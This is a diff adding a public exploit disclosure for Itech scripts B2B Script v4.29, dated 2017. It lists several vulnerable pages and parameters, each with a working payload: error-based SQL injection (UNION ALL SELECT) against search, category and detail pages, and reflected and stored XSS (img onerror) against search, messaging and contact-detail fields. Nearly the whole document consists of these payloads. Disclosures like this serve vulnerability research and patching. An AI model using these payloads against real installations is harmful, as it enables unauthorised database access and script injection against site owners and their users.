@@ -1,0 +1,78 @@
+Exploit Title : Itech scripts B2B Script v4.29 - Multiple Vulnerability
+Google Dork :    -
+Date : 12/02/2017
+Exploit Author : Marc Castejon <marc@silentbreach.com>
+Vendor Homepage : http://itechscripts.com/b2b-script/
+Software Link: http://b2b.itechscripts.com
+Type : webapps
+Platform: PHP
+Version: 4.29
+Sofware Price and Demo : $250
+
+------------------------------------------------
+
+Type: Error Based Sql Injection
+Vulnerable URL:http://localhost/[PATH]/search.php
+Vulnerable Parameters: keywords
+Method: GET
+Payload:  ') UNION ALL SELECT
+NULL,CONCAT(0x7171717671,0x5055787a7374645446494e58566e66484f74555968674d504262564348434b70657a4c45556b534e,0x716a626271)#
+
+------------------------------------------------
+
+Type: Error Based Sql Injection
+Vulnerable URL:http://localhost/[PATH]/search.php
+Vulnerable Parameters: rctyp
+Method: GET
+Payload: ') UNION ALL SELECT
+NULL,CONCAT(0x7171717671,0x5055787a7374645446494e58566e66484f74555968674d504262564348434b70657a4c45556b534e,0x716a626271)#
+
+-----------------------------------------------
+
+Type: Reflected XSS
+Vulnerable URL:http://localhost/[PATH]/search.php
+Vulnerable Parameters: rctyp
+Method: GET
+Payload: <img src=i onerror=prompt(1)>
+
+-----------------------------------------------
+
+Type: Reflected XSS
+Vulnerable URL:http://localhost/[PATH]/search.php
+Vulnerable Parameters: keyword
+Method: GET
+Payload: <img src=i onerror=prompt(1)>
+
+------------------------------------------------
+
+Type: Error Based Sql Injection
+Vulnerable URL:http://localhost/[PATH]/catcompany.php
+Vulnerable Parameters: token
+Method: GET
+Payload:  ') UNION ALL SELECT
+NULL,CONCAT(0x7171717671,0x5055787a7374645446494e58566e66484f74555968674d504262564348434b70657a4c45556b534e,0x716a626271)#
+
+-----------------------------------------------
+
+Type: Error Based Sql Injection
+Vulnerable URL:http://localhost/[PATH]/buyleads-details.php
+Vulnerable Parameters: id
+Method: GET
+Payload:  ') UNION ALL SELECT
+NULL,CONCAT(0x7171717671,0x5055787a7374645446494e58566e66484f74555968674d504262564348434b70657a4c45556b534e,0x716a626271)#
+
+-----------------------------------------------
+
+Type: Stored XSS
+Vulnerable URL:http://localhost/[PATH]/ajax-file/sendMessage.php
+Vulnerable Parameters: msg_message
+Method: POST
+Payload: <img src=i onerror=prompt(1)>
+
+------------------------------------------------
+
+Type: Stored XSS
+Vulnerable URL:http://localhost/[PATH]/my-contactdetails.php
+Vulnerable Parameters: fname
+Method: POST
+Payload: <img src=i onerror=prompt(1)>
